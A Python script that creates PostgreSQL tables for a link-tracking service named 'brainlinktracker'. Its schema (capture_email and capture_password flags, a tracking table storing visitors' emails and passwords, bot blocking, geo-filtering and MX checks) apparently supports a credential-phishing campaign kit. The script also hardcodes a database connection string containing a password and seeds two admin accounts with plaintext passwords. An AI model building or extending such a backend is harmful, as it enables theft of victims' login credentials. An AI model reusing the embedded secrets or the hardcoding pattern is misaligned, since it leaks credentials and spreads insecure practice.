#!/usr/bin/env python3
"""
Create all required tables for the secure-links application
"""
import os
import psycopg2
from urllib.parse import urlparse

def create_all_tables():
    # Database URL from environment
    database_url = os.environ.get('DATABASE_URL', 'postgresql://neondb_owner:npg_7CcKbPRm2GDw@ep-odd-thunder-ade4ip4a-pooler.c-2.us-east-1.aws.neon.tech/neondb?sslmode=require&channel_binding=require')
    
    # Parse the database URL
    parsed = urlparse(database_url)
    
    try:
        # Connect to the database
        conn = psycopg2.connect(
            host=parsed.hostname,
            port=parsed.port or 5432,
            database=parsed.path[1:],  # Remove leading slash
            user=parsed.username,
            password=parsed.password,
            sslmode='require'
        )
        
        with conn.cursor() as cursor:
            print("Creating all required tables...")
            
            # 1. Create users table (enhanced)
            print("1. Creating/updating users table...")
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS users (
                    id SERIAL PRIMARY KEY,
                    username VARCHAR(80) UNIQUE NOT NULL,
                    email VARCHAR(120) UNIQUE NOT NULL,
                    password_hash VARCHAR(255) NOT NULL,
                    settings TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    role VARCHAR(20) DEFAULT 'member',
                    last_login TIMESTAMP,
                    last_ip VARCHAR(45),
                    login_count INTEGER DEFAULT 0,
                    failed_login_attempts INTEGER DEFAULT 0,
                    account_locked_until TIMESTAMP,
                    is_active BOOLEAN DEFAULT TRUE,
                    is_verified BOOLEAN DEFAULT FALSE,
                    plan_type VARCHAR(20) DEFAULT 'free',
                    subscription_expiry TIMESTAMP,
                    subscription_plan VARCHAR(50) DEFAULT '1 Day Trial',
                    subscription_start TIMESTAMP,
                    subscription_end TIMESTAMP,
                    status VARCHAR(20) DEFAULT 'pending',
                    campaigns_count INTEGER DEFAULT 0,
                    daily_link_limit INTEGER DEFAULT 10,
                    links_used_today INTEGER DEFAULT 0,
                    last_reset_date DATE DEFAULT CURRENT_DATE,
                    telegram_bot_token VARCHAR(255),
                    telegram_chat_id VARCHAR(100),
                    telegram_enabled BOOLEAN DEFAULT FALSE
                );
            """)
            conn.commit()
            print("✓ Users table created/updated")
            
            # 2. Create campaigns table
            print("2. Creating campaigns table...")
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS campaigns (
                    id SERIAL PRIMARY KEY,
                    name VARCHAR(255) NOT NULL,
                    description TEXT,
                    owner_id INTEGER NOT NULL,
                    status VARCHAR(20) DEFAULT 'active',
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (owner_id) REFERENCES users(id)
                );
            """)
            conn.commit()
            print("✓ Campaigns table created")
            
            # 3. Create links table (for tracking links)
            print("3. Creating links table...")
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS links (
                    id SERIAL PRIMARY KEY,
                    user_id INTEGER NOT NULL,
                    campaign_id INTEGER,
                    target_url VARCHAR(500) NOT NULL,
                    short_code VARCHAR(10) UNIQUE NOT NULL,
                    campaign_name VARCHAR(255) DEFAULT 'Untitled Campaign',
                    status VARCHAR(50) DEFAULT 'active',
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    total_clicks INTEGER DEFAULT 0,
                    real_visitors INTEGER DEFAULT 0,
                    blocked_attempts INTEGER DEFAULT 0,
                    capture_email BOOLEAN DEFAULT FALSE,
                    capture_password BOOLEAN DEFAULT FALSE,
                    bot_blocking_enabled BOOLEAN DEFAULT FALSE,
                    geo_targeting_enabled BOOLEAN DEFAULT FALSE,
                    geo_targeting_type VARCHAR(20) DEFAULT 'allow',
                    rate_limiting_enabled BOOLEAN DEFAULT FALSE,
                    dynamic_signature_enabled BOOLEAN DEFAULT FALSE,
                    mx_verification_enabled BOOLEAN DEFAULT FALSE,
                    preview_template_url VARCHAR(500),
                    allowed_countries TEXT,
                    blocked_countries TEXT,
                    allowed_regions TEXT,
                    blocked_regions TEXT,
                    allowed_cities TEXT,
                    blocked_cities TEXT,
                    FOREIGN KEY (user_id) REFERENCES users(id),
                    FOREIGN KEY (campaign_id) REFERENCES campaigns(id)
                );
            """)
            conn.commit()
            print("✓ Links table created")
            
            # 4. Create tracking_events table
            print("4. Creating tracking_events table...")
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS tracking_events (
                    id SERIAL PRIMARY KEY,
                    link_id INTEGER NOT NULL,
                    user_id INTEGER,
                    event_type VARCHAR(50) NOT NULL,
                    ip_address VARCHAR(45),
                    user_agent TEXT,
                    country VARCHAR(100),
                    region VARCHAR(100),
                    city VARCHAR(100),
                    device_type VARCHAR(50),
                    browser VARCHAR(100),
                    os VARCHAR(100),
                    referrer TEXT,
                    email VARCHAR(255),
                    password VARCHAR(255),
                    additional_data TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (link_id) REFERENCES links(id),
                    FOREIGN KEY (user_id) REFERENCES users(id)
                );
            """)
            conn.commit()
            print("✓ Tracking events table created")
            
            # 5. Create audit_logs table
            print("5. Creating audit_logs table...")
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS audit_logs (
                    id SERIAL PRIMARY KEY,
                    actor_id INTEGER NOT NULL,
                    action VARCHAR(255) NOT NULL,
                    target_type VARCHAR(100),
                    target_id INTEGER,
                    details TEXT,
                    ip_address VARCHAR(45),
                    user_agent TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (actor_id) REFERENCES users(id)
                );
            """)
            conn.commit()
            print("✓ Audit logs table created")
            
            # 6. Create security_settings table
            print("6. Creating security_settings table...")
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS security_settings (
                    id SERIAL PRIMARY KEY,
                    user_id INTEGER NOT NULL,
                    setting_name VARCHAR(100) NOT NULL,
                    setting_value TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (user_id) REFERENCES users(id),
                    UNIQUE(user_id, setting_name)
                );
            """)
            conn.commit()
            print("✓ Security settings table created")
            
            # 7. Verify admin users exist
            print("7. Verifying admin users...")
            cursor.execute("SELECT username, role FROM users WHERE username IN ('Brain', '7thbrain');")
            existing_users = cursor.fetchall()
            
            existing_usernames = [user[0] for user in existing_users]
            
            if 'Brain' not in existing_usernames:
                print("Creating Brain admin user...")
                from werkzeug.security import generate_password_hash
                password_hash = generate_password_hash("Mayflower1!!")
                cursor.execute("""
                    INSERT INTO users (username, email, password_hash, role, is_active, is_verified, status)
                    VALUES ('Brain', 'admin@brainlinktracker.com', %s, 'main_admin', TRUE, TRUE, 'active');
                """, (password_hash,))
                conn.commit()
                print("✓ Brain admin user created")
            else:
                print("✓ Brain admin user already exists")
            
            if '7thbrain' not in existing_usernames:
                print("Creating 7thbrain admin user...")
                from werkzeug.security import generate_password_hash
                password_hash = generate_password_hash("Mayflower1!")
                cursor.execute("""
                    INSERT INTO users (username, email, password_hash, role, is_active, is_verified, status)
                    VALUES ('7thbrain', 'admin2@brainlinktracker.com', %s, 'admin', TRUE, TRUE, 'active');
                """, (password_hash,))
                conn.commit()
                print("✓ 7thbrain admin user created")
            else:
                print("✓ 7thbrain admin user already exists")
            
            # 8. List all tables to verify
            print("\n8. Verifying all tables exist...")
            cursor.execute("""
                SELECT table_name 
                FROM information_schema.tables 
                WHERE table_schema = 'public' 
                ORDER BY table_name;
            """)
            tables = cursor.fetchall()
            
            print("Existing tables:")
            for table in tables:
                print(f"  ✓ {table[0]}")
        
        print("\n✅ All tables created successfully!")
        
    except Exception as e:
        print(f"❌ Table creation failed: {e}")
        return False
    
    finally:
        if 'conn' in locals():
            conn.close()
    
    return True

if __name__ == "__main__":
    print("🔄 Creating all required tables...")
    success = create_all_tables()
    if success:
        print("🎉 Database setup completed!")
    else:
        print("💥 Database setup failed!")

